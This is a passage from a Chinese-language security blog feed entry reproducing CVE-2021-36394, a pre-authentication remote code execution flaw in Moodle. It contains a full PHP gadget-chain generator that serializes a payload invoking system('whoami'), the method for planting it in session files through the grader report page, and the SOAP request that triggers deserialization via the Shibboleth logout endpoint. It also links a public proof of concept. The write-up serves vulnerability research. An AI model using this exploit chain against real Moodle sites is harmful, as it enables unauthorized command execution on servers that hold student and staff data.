class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">core</span>\<span class="hljs-title class_">lock</span> &#123;<br>    <span class="hljs-title class_">class</span> <span class="hljs-title class_">lock</span> &#123;<br>        <span class="hljs-title class_">public</span> <span class="hljs-title class_">function</span> <span class="hljs-title class_">__construct</span>($<span class="hljs-title class_">class</span>)<br>        &#123;<br>            $<span class="hljs-title class_">this</span>-&gt;<span class="hljs-title class_">key</span> = $<span class="hljs-title class_">class</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">core_availability</span>&#123;<br>    <span class="hljs-title class_">class</span> <span class="hljs-title class_">tree</span> &#123;<br>        <span class="hljs-title class_">public</span> <span class="hljs-title class_">function</span> <span class="hljs-title class_">__construct</span>($<span class="hljs-title class_">class</span>)<br>        &#123;<br>            $<span class="hljs-title class_">this</span>-&gt;<span class="hljs-title class_">children</span> = $<span class="hljs-title class_">class</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">core</span>\<span class="hljs-title class_">dml</span>&#123;<br>    <span class="hljs-title class_">class</span> <span class="hljs-title class_">recordset_walk</span> &#123;<br>        <span class="hljs-title class_">public</span> <span class="hljs-title class_">function</span> <span class="hljs-title class_">__construct</span>($<span class="hljs-title class_">class</span>)<br>        &#123;<br>            $<span class="hljs-title class_">this</span>-&gt;<span class="hljs-title class_">recordset</span> = $<span class="hljs-title class_">class</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;callbackextra = <span class="hljs-literal">null</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;callback = <span class="hljs-string">&quot;system&quot;</span>;<br><br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> &#123;<br><br>    <span class="hljs-title class_">class</span> <span class="hljs-title class_">question_attempt_iterator</span>&#123;<br>        <span class="hljs-title class_">public</span> <span class="hljs-title class_">function</span> <span class="hljs-title class_">__construct</span>($<span class="hljs-title class_">class</span>)<br>        &#123;<br>            $<span class="hljs-title class_">this</span>-&gt;<span class="hljs-title class_">slots</span> = <span class="hljs-title class_">array</span>(<br>                &quot;<span class="hljs-title class_">xxx</span>&quot; =&gt; &quot;<span class="hljs-title class_">key</span>&quot;<br>            );<br>            <span class="hljs-variable language_">$this</span>-&gt;quba = <span class="hljs-variable">$class</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">question_usage_by_activity</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;questionattempts = <span class="hljs-keyword">array</span>(<br>                <span class="hljs-string">&quot;key&quot;</span> =&gt; <span class="hljs-string">&quot;whoami&quot;</span><br>            );<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">core_question_external</span></span>&#123;<br><br>    &#125;<br><br>    <span class="hljs-variable">$add_lib</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">core_question_external</span>();<br>    <span class="hljs-variable">$activity</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">question_usage_by_activity</span>();<br>    <span class="hljs-variable">$iterator</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">question_attempt_iterator</span>(<span class="hljs-variable">$activity</span>);<br>    <span class="hljs-variable">$walk</span> = <span class="hljs-keyword">new</span> core\dml\<span class="hljs-title function_ invoke__">recordset_walk</span>(<span class="hljs-variable">$iterator</span>);<br>    <span class="hljs-variable">$tree</span> = <span class="hljs-keyword">new</span> core_availability\<span class="hljs-title function_ invoke__">tree</span>(<span class="hljs-variable">$walk</span>);<br>    <span class="hljs-variable">$lock</span> = <span class="hljs-keyword">new</span> core\lock\<span class="hljs-title function_ invoke__">lock</span>(<span class="hljs-variable">$tree</span>);<br><br>    <span class="hljs-variable">$arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-variable">$add_lib</span>, <span class="hljs-variable">$lock</span>);<br>    <br>    <span class="hljs-variable">$value</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$arr</span>);<br><br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$value</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="session-文件写入"><a href="#session-文件写入" class="headerlink" title="session 文件写入"></a>session 文件写入</h3><p>接下来我们要想办法将反序列化后的内容写入 <code>session</code> 文件</p><p>来到文件 <code>grade/report/grader/index.php</code> ，这是我们可以直接访问到的文件，来看看有什么处理</p><p><img src="202210262316088.png" alt="202210262316088.png"></p><p><code>required_param</code> 与 <code>option_param</code> 差不多，一个是必须，一个是可选，都是获取参数，这里可以看到 <code>id</code> 是必须的，且为 <code>int</code> 类型，其他的都是可选的，继续看下面的</p><p><img src="202210262316384.png" alt="202210262318380.png"></p><p>可以看到，<code>$graderreportsifirst</code> 与 <code>$graderreportsilast</code> 被写入了 <code>$SESSION</code> ，也就是上面的 <code>sifirst</code> 和 <code>silast</code>，而 <code>$SESSION</code> 是 <code>global</code> 修饰的，指向 <code>$GLOBALS[&#39;SESSION&#39;]</code> ，在 <code>lib/classes/session/manager.php</code> 中赋值</p><p><img src="202210262316167.png" alt="202210262318380.png"></p><p>默认 <code>session</code> 会存储在文件中，因此我们的反序列化 <code>payload</code> 就会被写入 <code>session</code> 的文件存储起来，但是存储进 <code>session</code> 文件的 <code>payload</code> 如何被成功反序列化呢？这就看最关键的下一部分</p><h3 id="反序列化执行入口"><a href="#反序列化执行入口" class="headerlink" title="反序列化执行入口"></a>反序列化执行入口</h3><p>反序列化执行的入口出在 <code>Shibboleth</code> 认证模块，需要管理者开启该认证模块才可以使用，默认是不开启的，因此降低了此漏洞的影响面，但全网存在的 <code>moodle</code> 系统实在是多，所以影响还是可以的。</p><p>来到 <code>auth/shibboleth/logout.php</code></p><p><img src="202210262317875.png" alt="202210262318380.png"></p><p>首先是获取了输入流赋值给 <code>$inputstream</code> ，当 <code>$inputstream</code> 不为空时，会使用 <code>soap</code> 来处理，<code>$server-&gt;handle()</code> 默认处理输入流中的数据， 构造如下 <code>xml</code> 数据流访问就可以访问到 <code>LogoutNotification</code> 函数</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">soap:Envelope</span> <span class="hljs-attr">xmlns:soap</span>=<span class="hljs-string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">soap:Body</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">LogoutNotification</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">spsessionid</span>&gt;</span>xxxx<span class="hljs-tag">&lt;/<span class="hljs-name">spsessionid</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">LogoutNotification</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">soap:Body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">soap:Envelope</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="202210262318745.png" alt="202210262318380.png"></p><p>这里会先获取 <code>session</code> 存储的方式，文件存储与数据库存储，默认为文件存储，这时会进入 <code>\auth_shibboleth\helper::logout_file_session($spsessionid);</code></p><p><img src="202210262318274.png" alt="202210262318380.png"></p><p>这里获取了 <code>session</code> 存储的位置，然后遍历所有文件，获取内容，最后进入 <code>self::unserializesession($data[0]);</code></p><p><img src="202210262318380.png" alt="202210262318380.png"></p><p>这里首先以 <code>|</code> 分割字符串，然后以2个为一组，将每组的第二个反序列化，这里就解决了第二部分的问题，可以构造包含 <code>|</code> 与 <code>payload</code> 的字符串，就可以成功反序列化 <code>payload</code> ，构造如下</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lasso">aaaaaa|<span class="hljs-params">...</span><span class="hljs-params">...</span>payload<span class="hljs-params">...</span><span class="hljs-params">...</span>|bbbbbb<br></code></pre></td></tr></table></figure><h2 id="0x04-漏洞复现"><a href="#0x04-漏洞复现" class="headerlink" title="0x04 漏洞复现"></a>0x04 漏洞复现</h2><p>复现 <code>POC</code> 已上传 <code>github</code> <a href="https://github.com/N0puple/vulPOC/tree/main/Moodle/CVE-2021-36394%20Pre-Auth%20RCE%20in%20Moodle">传送门</a> ，需要注意的是，这个命令执行是无回显的，这里借助 <code>ceye</code> 平台进行测试</p><p>使用 <code>docker-compose.yml</code> 搭建环境</p><p>使用 <code>moodle_unserialize_rce.php</code> 生成反序列化字符串</p><p><img src="202210262318746.png" alt="image-20211017175905534.png"></p><p>使用 <code>moodle_rce.py</code> 进行测试</p><p><img src="202210262318747.png" alt="image-20211017180115851.png"></p><p>查看 <code>ceye</code> 平台</p><p><img src="202210262318748.png" alt="image-20211017180256269.png"></p><h2 id="0x05-参考链接"><a href="#0x05-参考链接" class="headerlink" title="0x05 参考链接"></a>0x05 参考链接</h2><ul><li><a href="https://haxolot.com/posts/2021/moodle_pre_auth_shibboleth_rce_part1/">https://haxolot.com/posts/2021/moodle_pre_auth_shibboleth_rce_part1&#x2F;</a></li><li><a href="https://github.com/dinhbaouit/CVE-2021-36394">https://github.com/dinhbaouit/CVE-2021-36394</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;本文首发于先知社区：&lt;a href=&quot;https://xz.aliyun.com/t/10383&quot;&gt;https://xz.aliyun.com/t/10383&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;本文仅用于技术讨论与研究，文中的实现方法切勿应用在任何违法场景。如因涉嫌违法造成的一切不良影</summary>
      
    
    
    
    <category term="PHP漏洞复现" scheme="https://d5shenwu.github.io/categories/PHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="PHP" scheme="https://d5shenwu.github.io/tags/PHP/"/>
    
    <category term="RCE" scheme="https://d5shenwu.github.io/tags/RCE/"/>
    
    <category term="CVE" scheme="https://d5shenwu.github.io/tags/CVE/"/>
    
    <category term="漏洞复现" scheme="https://d5shenwu.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    <category term="Moodle" scheme="https://d5shenwu.github.io/tags/Moodle/"/>
    
    <category term="未授权访问" scheme="https://d5shenwu.github.io/tags/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"/>
    
    <category term="PHP反序列化" scheme="https://d5shenwu.github.io/tags/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
</feed>
